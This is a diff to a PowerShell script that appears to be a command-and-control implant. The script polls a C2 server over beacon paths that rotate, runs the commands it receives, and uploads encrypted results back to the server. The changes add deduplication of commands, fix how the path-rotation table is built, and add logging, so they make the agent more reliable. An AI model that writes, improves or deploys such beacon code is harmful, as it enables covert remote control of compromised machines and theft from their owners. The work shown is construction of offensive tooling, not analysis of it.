@@ -326,6 +326,7 @@ function Get-RandomToken {
     return $padding
 }
 
+
 # Function to process commands from the C2 server
 function Process-Commands {
     param([array]$Commands)
@@ -334,11 +335,25 @@ function Process-Commands {
         return
     }
     
+    # Initialize tracking for processed command IDs if not exists
+    if (-not (Get-Variable -Name processedCommandIds -Scope Global -ErrorAction SilentlyContinue)) {
+        $global:processedCommandIds = @{}
+    }
+    
     # Process each command
     foreach ($command in $Commands) {
         $timestamp = $command.timestamp
         $commandType = $command.command_type
         $args = $command.args
+        
+        # Generate a unique command identifier
+        $commandId = "$timestamp-$commandType"
+        
+        # Check if we've already processed this exact command
+        if ($global:processedCommandIds.ContainsKey($commandId)) {
+            Write-Host "Skipping duplicate command: $commandType at $timestamp (already processed)"
+            continue
+        }
         
         # Execute based on command type
         try {
@@ -399,6 +414,9 @@ function Process-Commands {
                     }
                 }
                 
+                # Track this command as processed
+                $global:processedCommandIds[$commandId] = $true
+                
                 # Continue to the next command
                 continue
             }
@@ -433,13 +451,23 @@ function Process-Commands {
                     $rotationArgs = ConvertFrom-Json -InputObject $args
                     $rotationId = $rotationArgs.rotation_id
                     $nextRotationTime = $rotationArgs.next_rotation_time
-                    $paths = $rotationArgs.paths
                     
-                    Update-PathRotation -RotationId $rotationId -NextRotationTime $nextRotationTime -Paths $paths
+                    # Create a new hashtable manually from the paths object
+                    $newPaths = @{}
+                    $rotationArgs.paths | Get-Member -MemberType NoteProperty | ForEach-Object {
+                        $name = $_.Name
+                        $value = $rotationArgs.paths.$name
+                        $newPaths[$name] = $value
+                    }
+                    
+                    # Now update with properly constructed hashtable
+                    Update-PathRotation -RotationId $rotationId -NextRotationTime $nextRotationTime -Paths $newPaths
                     $result = "Path rotation updated: ID $rotationId, next rotation at $([DateTimeOffset]::FromUnixTimeSeconds($nextRotationTime).DateTime.ToString('yyyy-MM-dd HH:mm:ss'))"
+                    Write-Host $result
                 }
                 catch {
                     $result = "Path rotation failed: $_"
+                    Write-Host $result
                 }
             }
             else {
@@ -456,7 +484,15 @@ function Process-Commands {
             $encryptedResult = Encrypt-Data -PlainText $resultJson
             
             # Get current command result path
-            $cmdResultPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "cmd_result_path" } else { $commandResultPath }
+            $cmdResultPath = if ($global:pathRotationEnabled) { 
+                $path = Get-CurrentPath -PathType "cmd_result_path"
+                Write-Host "Using rotated command result path: $path"
+                $path
+            } else { 
+                Write-Host "Using static command result path: $commandResultPath"
+                $commandResultPath 
+            }
+            
             $resultUrl = "http://$serverAddress$cmdResultPath"
             
             $resultClient = New-ConfiguredWebClient
@@ -479,6 +515,9 @@ function Process-Commands {
             try {
                 $resultClient.UploadString($resultUrl, $payloadJson)
                 Write-Host "Command result sent successfully"
+                
+                # Track this command as processed
+                $global:processedCommandIds[$commandId] = $true
             }
             catch {
                 Write-Host "Error sending command result: $_"
@@ -517,6 +556,9 @@ function Process-Commands {
             try {
                 $resultClient.UploadString($resultUrl, $payloadJson)
                 Write-Host "Error result sent successfully"
+                
+                # Track this command as processed even if it resulted in an error
+                $global:processedCommandIds[$commandId] = $true
             }
             catch {
                 Write-Host "Error sending command error result: $_"
@@ -685,8 +727,10 @@ function Start-AgentLoop {
             
             # Get current beacon path based on rotation status
             $currentBeaconPath = if ($global:pathRotationEnabled -and -not $usingFallbackPaths) { 
+                Write-Host "Using rotated path: $(Get-CurrentPath -PathType 'beacon_path')"
                 Get-CurrentPath -PathType "beacon_path" 
             } else { 
+                Write-Host "Using static path: $beaconPath"
                 $beaconPath 
             }
             $beaconUrl = "http://$serverAddress$currentBeaconPath"
